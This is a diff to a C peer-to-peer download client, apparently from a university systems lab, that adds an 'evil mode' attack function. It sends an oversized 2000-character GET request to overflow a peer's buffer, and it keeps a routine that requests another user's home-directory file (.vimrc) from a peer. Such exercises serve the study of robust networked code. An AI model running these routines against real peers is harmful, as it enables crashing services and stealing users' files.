@@ -669,7 +669,6 @@ static void task_upload(task_t *t)
 	// Now, read file from disk and write it to the requesting peer.
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
-		printf(" %s %s %d %d\n", t->filename,"writes from buffer", t->head, t->tail);
 		if (ret == TBUF_ERROR) {
 			error("* Peer write error");
 			goto exit;
@@ -690,7 +689,107 @@ static void task_upload(task_t *t)
 	task_free(t);
 }
 
-void attack_steal_file(task_t *t, task_t *tracker_task) {
+static void attack_buffer_overrun(task_t *t, task_t *tracker_task)
+{
+	int i, ret = -1;
+	assert((!t || t->type == TASK_DOWNLOAD)
+	       && tracker_task->type == TASK_TRACKER);
+
+	// Quit if no peers, and skip this peer
+	if (!t || !t->peer_list) {
+		error("* No peers are willing to serve '%s'\n",
+		      (t ? t->filename : "that file"));
+		task_free(t);
+		return;
+	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
+		   && t->peer_list->port == listen_port)
+		goto try_again;
+
+	// Connect to the peer and write the GET command
+	message("* Connecting to %s:%d to download '%s'\n",
+		inet_ntoa(t->peer_list->addr), t->peer_list->port,
+		t->filename);
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if (t->peer_fd == -1) {
+		error("* Cannot connect to peer: %s\n", strerror(errno));
+		goto try_again;
+	}
+	char *long_evil_str = malloc(2001);
+	for (i = 0; i < 2000; i++) {
+		long_evil_str[i] = 'a';
+	}
+	long_evil_str[i] = 0;
+	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", long_evil_str);
+
+	// Open disk file for the result.
+	// If the filename already exists, save the file in a name like
+	// "foo.txt~1~".  However, if there are 50 local files, don't download
+	// at all.
+	for (i = 0; i < 50; i++) {
+		if (i == 0)
+			strcpy(t->disk_filename, t->filename);
+		else
+			sprintf(t->disk_filename, "%s~%d~", t->filename, i);
+		t->disk_fd = open(t->disk_filename,
+				  O_WRONLY | O_CREAT | O_EXCL, 0666);
+		if (t->disk_fd == -1 && errno != EEXIST) {
+			error("* Cannot open local file");
+			goto try_again;
+		} else if (t->disk_fd != -1) {
+			message("* Saving result to '%s'\n", t->disk_filename);
+			break;
+		}
+	}
+	if (t->disk_fd == -1) {
+		error("* Too many local files like '%s' exist already.\n\
+* Try 'rm %s.~*~' to remove them.\n", t->filename, t->filename);
+		task_free(t);
+		return;
+	}
+
+	// Read the file into the task buffer from the peer,
+	// and write it from the task buffer onto disk.
+	while (1) {
+		int ret = read_to_taskbuf(t->peer_fd, t);
+		if (ret == TBUF_ERROR) {
+			error("* Peer read error");
+			goto try_again;
+		} else if (ret == TBUF_END && t->head == t->tail)
+			/* End of file */
+			break;
+
+		ret = write_from_taskbuf(t->disk_fd, t);
+		if (ret == TBUF_ERROR) {
+			error("* Disk write error");
+			goto try_again;
+		}
+	}
+
+	// Empty files are usually a symptom of some error.
+	if (t->total_written > 0) {
+		message("* Downloaded '%s' was %lu bytes long\n",
+			t->disk_filename, (unsigned long) t->total_written);
+		// Inform the tracker that we now have the file,
+		// and can serve it to others!  (But ignore tracker errors.)
+		if (strcmp(t->filename, t->disk_filename) == 0) {
+			osp2p_writef(tracker_task->peer_fd, "HAVE %s\n",
+				     t->filename);
+			(void) read_tracker_response(tracker_task);
+		}
+		task_free(t);
+		return;
+	}
+	error("* Download was empty, trying next peer\n");
+
+    try_again:
+	if (t->disk_filename[0])
+		unlink(t->disk_filename);
+	// recursive call
+	task_pop_peer(t);
+	task_download(t, tracker_task);
+}
+
+static void attack_steal_file(task_t *t, task_t *tracker_task) {
 	int i, ret = -1;
 	assert((!t || t->type == TASK_DOWNLOAD)
 	       && tracker_task->type == TASK_TRACKER);
@@ -718,7 +817,6 @@ void attack_steal_file(task_t *t, task_t *tracker_task) {
 	}
 	*probe = '\0';
 	sprintf(t->filename, "%s%s%s", "/u/cs/ugrad/", victim_alias, "/.vimrc");
-	fprintf(stderr, "%s\n", t->filename);
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
 		t->filename);
@@ -764,7 +862,6 @@ void attack_steal_file(task_t *t, task_t *tracker_task) {
 	// and write it from the task buffer onto disk.
 	while (1) {
 		int ret = read_to_taskbuf(t->peer_fd, t);
-		printf(" %s %s %d %d\n", t->filename,"reads from buffer", t->head, t->tail);
 		if (ret == TBUF_ERROR) {
 			error("* Peer read error");
 			goto try_again;
@@ -887,23 +984,23 @@ int main(int argc, char *argv[])
 
 	// First, download files named on command line.
 	if (!evil_mode) {
-	for (; argc > 1; argc--, argv++) {
-		if ((t = start_download(tracker_task, argv[1]))) {
-			if (fork() == 0) {
-				task_download(t, tracker_task);
-				_exit(0);
-			} else {
-				continue;
+		for (; argc > 1; argc--, argv++) {
+			if ((t = start_download(tracker_task, argv[1]))) {
+				if (fork() == 0) {
+					task_download(t, tracker_task);
+					_exit(0);
+				} else {
+					continue;
+				}
 			}
 		}
-	}
 	}
 
 	if (evil_mode) {
 		for (; argc > 1; argc--, argv++) {
 			if ((t = start_download(tracker_task, argv[1]))) {
 				if (fork() == 0) {
-					attack_steal_file(t, tracker_task);
+					attack_buffer_overrun(t, tracker_task);
 					_exit(0);
 				} else {
 					continue;
